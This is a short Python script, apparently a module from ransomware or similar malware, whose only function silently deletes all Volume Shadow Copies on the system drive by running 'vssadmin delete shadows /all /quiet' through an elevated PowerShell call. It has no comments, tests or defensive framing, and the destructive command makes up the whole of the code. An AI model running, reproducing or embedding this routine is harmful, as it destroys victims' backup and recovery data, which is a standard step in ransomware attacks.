import os

def vss():
	
	try:
		volume = os.environ['SystemDrive']
		commande = f'vssadmin delete shadows /for={volume} /all /quiet'
		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'\"")
		return True
	except:
		return False


def main():
	if vss():
		return True
	else:
		return False

